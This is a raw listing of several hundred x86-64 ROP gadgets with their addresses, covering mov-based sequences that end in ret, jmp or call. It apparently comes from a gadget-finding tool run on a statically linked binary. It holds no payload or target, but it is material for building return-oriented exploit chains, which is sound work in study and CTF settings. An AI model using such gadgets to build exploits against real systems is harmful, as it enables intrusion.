0x0000000000461121 : mov eax, 6 ; ret
0x0000000000461131 : mov eax, 7 ; ret
0x000000000043a534 : mov eax, 8 ; pop rbx ; ret
0x00000000004402f0 : mov eax, 8 ; ret
0x0000000000403d47 : mov eax, dword ptr [r15 + 4] ; jmp 0x403d15
0x0000000000409611 : mov eax, dword ptr [rax + 0x20] ; jmp rax
0x000000000045e814 : mov eax, dword ptr [rax + 0x4c] ; ret
0x000000000040dcf8 : mov eax, dword ptr [rax + 0x68] ; test rax, rax ; jne 0x40dcf9 ; ret
0x000000000046d0f1 : mov eax, dword ptr [rax + 8] ; ret
0x0000000000465e89 : mov eax, dword ptr [rax + rax] ; add byte ptr [rbx - 0x76b7ffbb], cl ; ret 0x314c
0x0000000000448dd7 : mov eax, dword ptr [rax + rbp*8] ; test rax, rax ; je 0x448de9 ; call rax
0x000000000047a6d0 : mov eax, dword ptr [rax + rbp*8] ; test rax, rax ; je 0x47a6e2 ; call rax
0x000000000044a34f : mov eax, dword ptr [rax + rdi*8 + 0x80] ; ret
0x000000000044f201 : mov eax, dword ptr [rax + rdi*8] ; jmp rax
0x0000000000459c80 : mov eax, dword ptr [rax + rsi*8] ; jmp rax
0x0000000000475189 : mov eax, dword ptr [rax] ; lea rax, [rax + 8] ; mov qword ptr [r10], r8 ; ret
0x0000000000475171 : mov eax, dword ptr [rax] ; mov qword ptr [r10], r8 ; ret
0x000000000046b789 : mov eax, dword ptr [rax] ; ret
0x00000000004680b0 : mov eax, dword ptr [rbp - 0xb8] ; add rax, r11 ; call rax
0x0000000000467e81 : mov eax, dword ptr [rbx + 0x10] ; add rax, qword ptr [r14] ; call rax
0x000000000040d47d : mov eax, dword ptr [rbx + 0x18] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x000000000046f999 : mov eax, dword ptr [rbx + 0x18] ; mov qword ptr [rax], rdi ; pop rbx ; ret
0x000000000040d9d9 : mov eax, dword ptr [rbx + 0x40] ; add rsp, 0x20 ; pop rbx ; jmp rax
0x0000000000471704 : mov eax, dword ptr [rbx] ; add rax, qword ptr [rdx + 8] ; call rax
0x00000000004348b4 : mov eax, dword ptr [rcx + 3] ; mov dword ptr [rdx + 3], eax ; mov rax, rdi ; ret
0x00000000004348c6 : mov eax, dword ptr [rcx + 5] ; mov dword ptr [rdx + 5], eax ; mov rax, rdi ; ret
0x00000000004348d6 : mov eax, dword ptr [rcx + 6] ; mov dword ptr [rdx + 6], eax ; mov rax, rdi ; ret
0x00000000004348e6 : mov eax, dword ptr [rcx + 7] ; mov dword ptr [rdx + 7], eax ; mov rax, rdi ; ret
0x00000000004348f6 : mov eax, dword ptr [rcx + 8] ; mov dword ptr [rdx + 8], eax ; mov rax, rdi ; ret
0x000000000042f4ca : mov eax, dword ptr [rcx + rax*4] ; mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x0000000000430da2 : mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x0000000000436040 : mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; lea rax, [rdx + 3] ; ret
0x0000000000434880 : mov eax, dword ptr [rcx] ; mov dword ptr [rdx], eax ; mov rax, rdi ; ret
0x0000000000435f91 : mov eax, dword ptr [rcx] ; mov qword ptr [rdx], rax ; lea rax, [rdx + 7] ; ret
0x00000000004347e1 : mov eax, dword ptr [rcx] ; mov qword ptr [rdx], rax ; mov rax, rdi ; ret
0x0000000000436011 : mov eax, dword ptr [rcx] ; mov word ptr [rdx], ax ; lea rax, [rdx + 1] ; ret
0x0000000000434861 : mov eax, dword ptr [rcx] ; mov word ptr [rdx], ax ; mov rax, rdi ; ret
0x000000000046a17a : mov eax, dword ptr [rcx] ; ret
0x0000000000468736 : mov eax, dword ptr [rdi + 0x10] ; add rax, qword ptr [r14] ; call rax
0x000000000045e6ce : mov eax, dword ptr [rdi + 0x10] ; sar rdx, 2 ; sub eax, edx ; ret
0x000000000040e9f0 : mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x000000000040ea18 : mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x000000000047a98d : mov eax, dword ptr [rdi + 0x20] ; test rax, rax ; je 0x47a9a4 ; call rax
0x000000000045e811 : mov eax, dword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x000000000040ed01 : mov eax, dword ptr [rdi + 0x68] ; ret
0x00000000004774e1 : mov eax, dword ptr [rdi + 0x90] ; ret
0x0000000000477531 : mov eax, dword ptr [rdi + 0x98] ; ret
0x0000000000477571 : mov eax, dword ptr [rdi + 0xa0] ; ret
0x00000000004775d1 : mov eax, dword ptr [rdi + 0xa8] ; ret
0x00000000004775c1 : mov eax, dword ptr [rdi + 0xb0] ; ret
0x0000000000477581 : mov eax, dword ptr [rdi + 0xb8] ; ret
0x0000000000403d48 : mov eax, dword ptr [rdi + 4] ; jmp 0x403d14
0x0000000000472661 : mov eax, dword ptr [rdi] ; cmp rax, rsi ; je 0x472678 ; ret
0x000000000040f5f1 : mov eax, dword ptr [rdi] ; mov dword ptr [rip + 0x29479b], eax ; ret
0x000000000040e9e5 : mov eax, dword ptr [rdi] ; mov qword ptr [rdx], rax ; ret
0x000000000040f691 : mov eax, dword ptr [rdi] ; mov qword ptr [rip + 0x2921ae], rax ; ret
0x000000000040f681 : mov eax, dword ptr [rdi] ; mov qword ptr [rip + 0x2921b6], rax ; ret
0x000000000040f631 : mov eax, dword ptr [rdi] ; mov qword ptr [rip + 0x2921be], rax ; ret
0x000000000040f621 : mov eax, dword ptr [rdi] ; mov qword ptr [rip + 0x2921d6], rax ; ret
0x0000000000479835 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x479847 ; ret
0x0000000000479850 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x479867 ; ret
0x0000000000479a80 : mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x479a97 ; ret
0x000000000043a9e7 : mov eax, dword ptr [rdx + rax*4] ; sub eax, dword ptr [rdx + rcx*4] ; je 0x43a9d9 ; ret
0x000000000042d0d6 : mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x000000000045e237 : mov eax, dword ptr [rdx] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000040e9d1 : mov eax, dword ptr [rdx] ; test rax, rax ; jne 0x40e9d0 ; ret
0x0000000000470030 : mov eax, dword ptr [rip + 0x23488a] ; ret
0x000000000046ae9b : mov eax, dword ptr [rip + 0x239507] ; mov qword ptr [rsi], rax ; ret
0x000000000046ae2a : mov eax, dword ptr [rip + 0x239580] ; ret
0x0000000000447d01 : mov eax, dword ptr [rip + 0x25c171] ; ret
0x00000000004403f1 : mov eax, dword ptr [rip + 0x264531] ; ret
0x000000000040ece1 : mov eax, dword ptr [rip + 0x292439] ; ret
0x0000000000478422 : mov eax, dword ptr [rsi + 0x10] ; ret
0x00000000004752b1 : mov eax, dword ptr [rsi + 0xa8] ; ret
0x0000000000475284 : mov eax, dword ptr [rsi + 0xb0] ; ret
0x00000000004752a1 : mov eax, dword ptr [rsi + 0xb8] ; ret
0x0000000000478441 : mov eax, dword ptr [rsi + 8] ; ret
0x000000000044ee64 : mov eax, dword ptr [rsi + rax*8] ; jmp rax
0x00000000004775a6 : mov eax, dword ptr [rsp + 0x10] ; add rsp, 0x28 ; ret
0x00000000004010e3 : mov eax, dword ptr [rsp + 0x18] ; call rax
0x0000000000444d93 : mov eax, dword ptr [rsp + 0x20] ; call rax
0x000000000043bdaa : mov eax, dword ptr [rsp + 0xc] ; add rsp, 0x10 ; pop rbx ; ret
0x00000000004067a9 : mov eax, dword ptr [rsp + 8] ; call rax
0x000000000040672e : mov eax, dword ptr [rsp + 8] ; mov qword ptr [rsp + 0x20], r10 ; call rax
0x0000000000474d1a : mov eax, dword ptr [rsp] ; add rsp, 0x38 ; ret
0x000000000043bcc7 : mov eax, dword ptr [rsp] ; jmp 0x43bc6a
0x000000000046b788 : mov eax, dword ptr fs:[rax] ; ret
0x00000000004109bf : mov eax, eax ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000415123 : mov eax, eax ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000414fab : mov eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046a1ee : mov eax, eax ; pop rbx ; ret
0x000000000043a572 : mov eax, eax ; ret
0x00000000004614b4 : mov eax, eax ; shr rax, 2 ; vzeroupper ; ret
0x0000000000460301 : mov eax, eax ; vzeroupper ; ret
0x000000000040835b : mov eax, ebp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000474937 : mov eax, ebp ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000043cc0e : mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000401ab1 : mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000409a62 : mov eax, ebp ; pop rbx ; pop rbp ; ret
0x000000000046f093 : mov eax, ebx ; adc rax, rdx ; pop rbp ; pop rbx ; ret
0x0000000000472dc6 : mov eax, ebx ; jne 0x472ddd ; add rsp, 0x30 ; pop rbx ; ret
0x0000000000408548 : mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000040bf45 : mov eax, ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040fc54 : mov eax, ebx ; pop rbx ; pop rbp ; ret
0x000000000040a5cb : mov eax, ebx ; pop rbx ; ret
0x000000000046ef57 : mov eax, ecx ; adc eax, eax ; ret
0x0000000000456237 : mov eax, ecx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000045617c : mov eax, ecx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000451675 : mov eax, ecx ; ret
0x000000000040a4c3 : mov eax, edi ; mov dword ptr [rbx], ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000410284 : mov eax, edi ; pop rbp ; pop r12 ; ret
0x000000000040a4f4 : mov eax, edi ; ret
0x0000000000414752 : mov eax, edx ; pop rbp ; pop r12 ; ret
0x00000000004619ab : mov eax, edx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000455d0b : mov eax, edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004081f1 : mov eax, edx ; pop rbx ; pop rbp ; ret
0x0000000000415e6f : mov eax, edx ; pop rbx ; ret
0x00000000004331a9 : mov eax, edx ; ret
0x000000000046d9b6 : mov eax, esi ; mov rsp, r8 ; mov rbp, r9 ; jmp rdx
0x000000000040b9fa : mov eax, esi ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000045cc34 : mov eax, esi ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046f364 : mov eax, esi ; ret
0x000000000040da95 : mov eax, esp ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x0000000000401d07 : mov eax, esp ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000046b5d2 : mov eax, esp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000451674 : mov eax, r9d ; ret
0x000000000044fd6d : mov ebp, 0x89000010 ; ret 0x349
0x0000000000487904 : mov ebp, 0xc000000f ; sldt word ptr [rax] ; ret
0x000000000048e9bd : mov ebp, 0xc1c0bfbe ; ret 0xc4c3
0x000000000045fac8 : mov ebp, 0xf80148c0 ; ret
0x000000000045fd4c : mov ebp, 0xf80148c6 ; ret
0x0000000000490126 : mov ebp, 0xfb67d10d ; ret
0x000000000045701f : mov ebp, 0xfffff6f0 ; jmp qword ptr [rdx + rax*8]
0x0000000000456ace : mov ebp, 0xfffff730 ; call rax
0x000000000044c20c : mov ebp, 0xfffff758 ; call rax
0x0000000000459a15 : mov ebp, 0xfffffae8 ; add byte ptr [rcx - 0x77], al ; ret
0x0000000000477a03 : mov ebp, dword ptr [rbp] ; mov rsp, rcx ; ret
0x0000000000478c4a : mov ebp, dword ptr [rsp + 8] ; jmp 0x478c68
0x000000000045cec9 : mov ebp, eax ; jmp 0x45ce92
0x000000000046d9bc : mov ebp, ecx ; jmp rdx
0x000000000043da24 : mov ebx, 0xafb8341 ; je 0x43da33 ; ret
0x000000000048e9bb : mov ebx, 0xbfbebdbc ; rol cl, 0xc2 ; ret
0x0000000000416b7b : mov ebx, 0xf480001 ; ret 0x66c3
0x000000000047d9dc : mov ebx, ecx ; sti ; call rsi
0x0000000000449d46 : mov ebx, edi ; test rax, rax ; je 0x449d56 ; call rax
0x000000000046f74b : mov ecx, 0x1f0fff ; pop rbx ; ret
0x0000000000461d2c : mov ecx, 0x48000000 ; add esp, 0x78 ; ret
0x000000000046adf3 : mov ecx, 0x48002395 ; add esp, 8 ; ret
0x000000000048d5bd : mov ecx, 0xa8e0fffd ; std ; jmp qword ptr [rax]
0x000000000048d5b9 : mov ecx, 0xb99dfffd ; std ; jmp rax
0x000000000048e9b9 : mov ecx, 0xbdbcbbba ; mov esi, 0xc2c1c0bf ; ret
0x000000000042a8cc : mov ecx, dword ptr [rcx - 4] ; mov dword ptr [rdi], esi ; mov dword ptr [r9 - 4], ecx ; ret
0x000000000041fc7e : mov ecx, dword ptr [rdi - 0x73] ; or al, 0xb ; jmp r9
0x000000000045e7eb : mov ecx, dword ptr [rdx + 0x48] ; cmp ecx, dword ptr [rdx + 0x4c] ; cmove eax, ecx ; ret
0x000000000042d0d3 : mov ecx, dword ptr [rdx + rcx*4] ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x0000000000421ff3 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 5], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004221f3 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 6], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x00000000004223f3 : mov ecx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 7], edx ; mov dword ptr [rdi - 4], ecx ; ret
0x0000000000436510 : mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x0000000000436551 : mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 8], dh ; mov qword ptr [rdi], rcx ; ret
0x0000000000427a63 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 1], edx ; mov dword ptr [rdi], ecx ; ret
0x00000000004279f3 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 2], edx ; mov dword ptr [rdi], ecx ; ret
0x0000000000427983 : mov ecx, dword ptr [rsi] ; mov dword ptr [rdi + 3], edx ; mov dword ptr [rdi], ecx ; ret
0x00000000004278a5 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 1], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000427835 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 2], rdx ; mov qword ptr [rdi], rcx ; ret
0x00000000004277c5 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 3], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000427755 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 4], rdx ; mov qword ptr [rdi], rcx ; ret
0x00000000004276e5 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 5], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000427675 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 6], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000427605 : mov ecx, dword ptr [rsi] ; mov qword ptr [rdi + 7], rdx ; mov qword ptr [rdi], rcx ; ret
0x0000000000427b45 : mov ecx, dword ptr [rsi] ; mov word ptr [rdi + 1], dx ; mov word ptr [rdi], cx ; ret
0x00000000004364f1 : mov ecx, dword ptr [rsi] ; mov word ptr [rdi], cx ; mov byte ptr [rdi + 2], dh ; ret
0x000000000046d1e7 : mov ecx, dword ptr [rsp + 0x40] ; add rsp, 0x48 ; jmp qword ptr [rax]
0x000000000046d175 : mov ecx, dword ptr [rsp + 0x40] ; add rsp, 0x58 ; jmp qword ptr [rax]
0x000000000045ee21 : mov ecx, eax ; jmp 0x45edeb
0x000000000044022b : mov ecx, ebp ; call rbx
0x000000000040dc30 : mov ecx, edx ; pop rbx ; xor edx, edx ; jmp rax
0x00000000004392d2 : mov ecx, edx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x000000000040dc6a : mov ecx, edx ; xor edx, edx ; jmp rax
0x0000000000460ab5 : mov ecx, esi ; call rbx
0x000000000044dada : mov edi, 0x440f48c0 ; ret 0xe2e9
0x00000000004009fc : mov edi, 0x6a2bd0 ; jmp rax
0x0000000000400b2d : mov edi, 0x90000078 ; leave ; ret
0x0000000000477236 : mov edi, 1 ; call r14
0x000000000047718c : mov edi, 1 ; call rax
0x0000000000477efc : mov edi, 1 ; jmp rax
0x0000000000406f24 : mov edi, dword ptr [rax + 0x20] ; call rdx
0x000000000044c20b : mov edi, dword ptr [rbp - 0x8a8] ; call rax
0x0000000000456acd : mov edi, dword ptr [rbp - 0x8d0] ; call rax
0x0000000000477881 : mov edi, dword ptr [rbp - 8] ; leave ; ret
0x00000000004067a5 : mov edi, dword ptr [rbp] ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000046ae76 : mov edi, dword ptr [rdi + 8] ; test rdi, rdi ; jne 0x46ae59 ; ret
0x00000000004903e6 : mov edi, dword ptr [rdx] ; ret
0x000000000047915f : mov edi, dword ptr [rsp + 0x10] ; call r14
0x000000000043cad9 : mov edi, dword ptr [rsp + 0x10] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x000000000046d894 : mov edi, dword ptr [rsp + 0x18] ; mov rdx, qword ptr [rsp + 0x10] ; call rdx
0x0000000000442550 : mov edi, dword ptr [rsp + 0x20] ; call r15
0x000000000044378a : mov edi, dword ptr [rsp + 0x30] ; call r14
0x000000000044361f : mov edi, dword ptr [rsp + 0x30] ; call r15
0x0000000000442eef : mov edi, dword ptr [rsp + 0x30] ; call rbx
0x00000000004428fb : mov edi, dword ptr [rsp + 0x38] ; call r14
0x00000000004445d6 : mov edi, dword ptr [rsp + 0x38] ; call r15
0x00000000004441ae : mov edi, dword ptr [rsp + 0x38] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x000000000044524b : mov edi, dword ptr [rsp + 0x40] ; call r15
0x0000000000444d8e : mov edi, dword ptr [rsp + 0x40] ; mov rax, qword ptr [rsp + 0x20] ; call rax
0x0000000000446134 : mov edi, dword ptr [rsp + 0x48] ; call r14
0x00000000004439e4 : mov edi, dword ptr [rsp + 0x48] ; call r15
0x00000000004010de : mov edi, dword ptr [rsp + 0xc] ; mov rax, qword ptr [rsp + 0x18] ; call rax
0x000000000040da0b : mov edi, dword ptr [rsp + 8] ; add rsp, 0x20 ; pop rbx ; jmp rax
0x000000000044a83c : mov edi, dword ptr [rsp + 8] ; call r12
0x000000000040d4a6 : mov edi, dword ptr [rsp] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x000000000047804c : mov edi, dword ptr [rsp] ; mov rdx, qword ptr [rbp] ; call r12
0x00000000004490e9 : mov edi, eax ; mov byte ptr [rdi], 0 ; pop rbx ; pop r14 ; ret
0x00000000004017de : mov edi, ebp ; call qword ptr [r15 + rbx*8]
0x00000000004741ca : mov edi, ebp ; call qword ptr [rax]
0x0000000000474066 : mov edi, ebp ; call qword ptr [rbx]
0x000000000044a828 : mov edi, ebp ; call r12
0x0000000000478f3c : mov edi, ebp ; call r14
0x0000000000415136 : mov edi, ebp ; call rax
0x0000000000460961 : mov edi, ebp ; call rbx
0x0000000000460ab2 : mov edi, ebp ; mov r9, r14 ; call rbx
0x00000000004067f9 : mov edi, ebp ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000043cc9a : mov edi, ebp ; mov rsi, qword ptr [rax] ; call r14
0x00000000004486cb : mov edi, ebx ; call 0x414964
0x0000000000447cba : mov edi, ebx ; call r12
0x00000000004405d9 : mov edi, ebx ; call r15
0x000000000040b306 : mov edi, ebx ; call rax
0x000000000040afba : mov edi, ebx ; pop rbx ; pop rbp ; jmp rax
0x000000000045deaf : mov edi, ebx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x000000000040b02a : mov edi, ebx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; jmp rax
0x0000000000414daf : mov edi, edi ; call 0x411054
0x000000000045eb78 : mov edi, edi ; call r12
0x0000000000409083 : mov edi, edi ; call rax
0x000000000044a934 : mov edi, edi ; mov rdx, r13 ; call r12
0x000000000046f3e1 : mov edi, edx ; mov byte ptr [rsi], al ; jne 0x46f3c9 ; mov rax, rsi ; ret
0x000000000041340f : mov edi, edx ; pop rbx ; jmp 0x40f6a5
0x0000000000413f44 : mov edi, esi ; call 0x4101d4
0x000000000044a867 : mov edi, esi ; call r12
0x0000000000440bcb : mov edi, esi ; mov rsi, qword ptr [rbp - 0x70] ; call rsi
0x0000000000477f54 : mov edi, esp ; call r15
0x000000000045e8a0 : mov edi, esp ; call rbx
0x000000000043a476 : mov edx, 0 ; cmove rax, rdx ; pop rbx ; ret
0x000000000040a646 : mov edx, 0x130 ; pop rbx ; ret
0x000000000044571e : mov edx, 0x1d0 ; call 0x4019f7
0x00000000004456ff : mov edx, 0x1d6 ; call 0x4019f7
0x000000000043d896 : mov edx, 0x64 ; test eax, eax ; cmove eax, edx ; ret
0x0000000000465723 : mov edx, 0x828 ; call 0x4019f7
0x0000000000465760 : mov edx, 0x829 ; call 0x4019f7
0x0000000000408db2 : mov edx, 0x89000552 ; ret 0xffb8
0x000000000048d655 : mov edx, 0xb178fffd ; std ; call qword ptr [rax]
0x000000000048f89e : mov edx, 0xcac982a4 ; call 0xffffffffaf0b971e
0x0000000000442387 : mov edx, 0xffffffff ; cmovs eax, edx ; ret
0x000000000046a10c : mov edx, 1 ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x0000000000478050 : mov edx, dword ptr [rbp] ; call r12
0x000000000046f979 : mov edx, dword ptr [rbx + 0x18] ; mov qword ptr [rdx], rax ; pop rbx ; ret
0x0000000000430d9f : mov edx, dword ptr [rcx + rdx*4] ; mov eax, dword ptr [rcx + rax*4] ; sub eax, edx ; ret
0x000000000042f4cd : mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x000000000046f98d : mov edx, dword ptr [rdi + 0x30] ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x0000000000478f39 : mov edx, dword ptr [rdi] ; mov rdi, r13 ; call r14
0x0000000000436532 : mov edx, dword ptr [rsi + 3] ; mov dword ptr [rdi], ecx ; mov dword ptr [rdi + 3], edx ; ret
0x0000000000436523 : mov edx, dword ptr [rsi + 4] ; mov dword ptr [rdi], ecx ; mov word ptr [rdi + 4], dx ; ret
0x0000000000436573 : mov edx, dword ptr [rsi + 7] ; mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 7], edx ; ret
0x0000000000436583 : mov edx, dword ptr [rsi + 8] ; mov qword ptr [rdi], rcx ; mov dword ptr [rdi + 8], edx ; ret
0x0000000000421a31 : mov edx, dword ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x0000000000421df0 : mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000421681 : mov edx, dword ptr [rsi - 8] ; mov qword ptr [rdi - 8], rdx ; ret
0x0000000000436b20 : mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; lea rax, [rdi + 3] ; ret
0x0000000000427ad0 : mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x0000000000436b71 : mov edx, dword ptr [rsi] ; mov qword ptr [rdi], rdx ; lea rax, [rdi + 7] ; ret
0x0000000000427911 : mov edx, dword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x0000000000436b01 : mov edx, dword ptr [rsi] ; mov word ptr [rdi], dx ; lea rax, [rdi + 1] ; ret
0x00000000004364e1 : mov edx, dword ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x000000000046d899 : mov edx, dword ptr [rsp + 0x10] ; call rdx
0x0000000000416275 : mov edx, dword ptr [rsp + 0x18] ; jmp 0x416243
0x0000000000477189 : mov edx, dword ptr [rsp] ; mov edi, 1 ; call rax
0x000000000046253b : mov edx, eax ; jmp 0x462522
0x000000000044a937 : mov edx, ebp ; call r12
0x00000000004741c5 : mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x0000000000474061 : mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rbx]
0x0000000000474021 : mov edx, ebp ; mov rsi, r12 ; mov edi, ebp ; call rax
0x000000000044a861 : mov edx, ebp ; mov rsi, rbp ; mov rdi, r14 ; call r12
0x000000000044a9a4 : mov edx, ebp ; mov rsi, rbp ; mov rdi, rbx ; call r12
0x000000000044a87c : mov edx, ebp ; mov rsi, rbx ; mov rdi, rbp ; call r12
0x0000000000439f98 : mov edx, edi ; rep stosb byte ptr [rdi], al ; mov rax, rdx ; ret
0x00000000004620d9 : mov es, word ptr [rbx] ; add al, 0x11 ; ret
0x00000000004490ea : mov esi, 0x415b0007 ; pop rsi ; ret
0x00000000004416f2 : mov esi, 0x83480147 ; ret
0x000000000047de24 : mov esi, 0xb6fffbd7 ; fdivr st(3) ; jmp qword ptr [rsi]
0x000000000048e9be : mov esi, 0xc2c1c0bf ; ret
0x000000000043a404 : mov esi, 0xf000000 ; lahf ; ret 0xea81
0x000000000045c1e4 : mov esi, 1 ; mov rdi, rbx ; call rax
0x000000000043c848 : mov esi, 2 ; jmp rax
0x000000000043c85b : mov esi, 3 ; pop rbp ; pop r12 ; jmp rax
0x0000000000448cdc : mov esi, dword ptr [rax + rdi*8] ; test rsi, rsi ; je 0x448cee ; call rsi
0x000000000043cc9d : mov esi, dword ptr [rax] ; call r14
0x000000000047787d : mov esi, dword ptr [rbp - 0x10] ; mov r15, qword ptr [rbp - 8] ; leave ; ret
0x0000000000440bce : mov esi, dword ptr [rbp - 0x70] ; call rsi
0x000000000047915c : mov esi, dword ptr [rdi] ; mov rdi, qword ptr [rsp + 0x10] ; call r14
0x0000000000478005 : mov esi, dword ptr [rsi] ; call r12
0x0000000000439303 : mov esi, dword ptr [rsi] ; mov dword ptr [rdi + rdx - 4], ecx ; mov dword ptr [rdi], esi ; ret
0x000000000044ab4e : mov esi, dword ptr [rsp + 0x10] ; mov rdi, rbp ; call r12
0x0000000000414a01 : mov esi, dword ptr [rsp + 0x18] ; add rsp, 0x10 ; pop rbx ; jmp rax
0x0000000000440226 : mov esi, dword ptr [rsp + 0x18] ; mov r9, r13 ; call rbx
0x0000000000415131 : mov esi, dword ptr [rsp + 0x28] ; mov rdi, rbp ; call rax
0x0000000000442eea : mov esi, dword ptr [rsp + 0x38] ; mov rdi, qword ptr [rsp + 0x30] ; call rbx
0x000000000046a173 : mov esi, eax ; cmp rcx, rsi ; jne 0x46a159 ; mov eax, dword ptr [rcx] ; ret
0x000000000046f705 : mov esi, eax ; repe cmpsb byte ptr [rsi], byte ptr [rdi] ; jne 0x46f717 ; ret
0x000000000044a839 : mov esi, ebp ; mov rdi, qword ptr [rsp + 8] ; call r12
0x000000000044a864 : mov esi, ebp ; mov rdi, r14 ; call r12
0x000000000044a931 : mov esi, ebp ; mov rdi, r15 ; mov rdx, r13 ; call r12
0x000000000044a9a7 : mov esi, ebp ; mov rdi, rbx ; call r12
0x0000000000453166 : mov esi, ebp ; mov rdi, rbx ; call rax
0x000000000044a87f : mov esi, ebx ; mov rdi, rbp ; call r12
0x000000000041340c : mov esi, ebx ; mov rdi, rdx ; pop rbx ; jmp 0x40f6a8
0x0000000000477efa : mov esi, edi ; mov edi, 1 ; jmp rax
0x000000000044c208 : mov esi, edi ; mov rdi, qword ptr [rbp - 0x8a8] ; call rax
0x0000000000477f51 : mov esi, esi ; mov rdi, r12 ; call r15
0x00000000004741c8 : mov esi, esp ; mov edi, ebp ; call qword ptr [rax]
0x0000000000474064 : mov esi, esp ; mov edi, ebp ; call qword ptr [rbx]
0x0000000000474024 : mov esi, esp ; mov edi, ebp ; call rax
0x0000000000413f41 : mov esi, esp ; mov rdi, r14 ; call 0x4101d7
0x0000000000414dac : mov esi, esp ; mov rdi, r15 ; call 0x411057
0x000000000045deac : mov esi, esp ; mov rdi, rbx ; pop rbx ; pop rbp ; pop r12 ; jmp rax
0x0000000000405a5b : mov esp, 0x24448b48 ; sub byte ptr [rax - 0x7d], cl ; ret
0x000000000041d711 : mov esp, 0x448d48c0 ; cmp al, dh ; ret
0x000000000041d741 : mov esp, 0x448d48c0 ; cmp byte ptr [rax], ah ; ret
0x000000000041d731 : mov esp, 0x448d48c0 ; cmp byte ptr [rax], dl ; ret
0x0000000000415b44 : mov esp, 0x5c70028 ; ret
0x000000000049bcf8 : mov esp, 0x7400007d ; cld ; call qword ptr [rcx]
0x0000000000402832 : mov esp, 0x8024 ; add al, ch ; ret
0x0000000000402776 : mov esp, 0x8024 ; add byte ptr [rax - 0x39], cl ; ret
0x000000000040e052 : mov esp, 0x8c48348 ; pop rbx ; pop rbp ; ret
0x0000000000492ffc : mov esp, 0xccfffdc9 ; leave ; std ; jmp rsp
0x0000000000432e53 : mov esp, 0xd00148d2 ; sub rax, rdi ; ret
0x000000000045cdd4 : mov esp, 0xd824 ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x000000000041d7fb : mov esp, 0xf80148c0 ; add rax, rcx ; ret
0x000000000041d721 : mov esp, 0xf80148c0 ; ret
0x000000000041dc12 : mov esp, 0xf80148c0 ; vzeroupper ; ret
0x0000000000400756 : mov esp, eax ; call 0x43a3f8
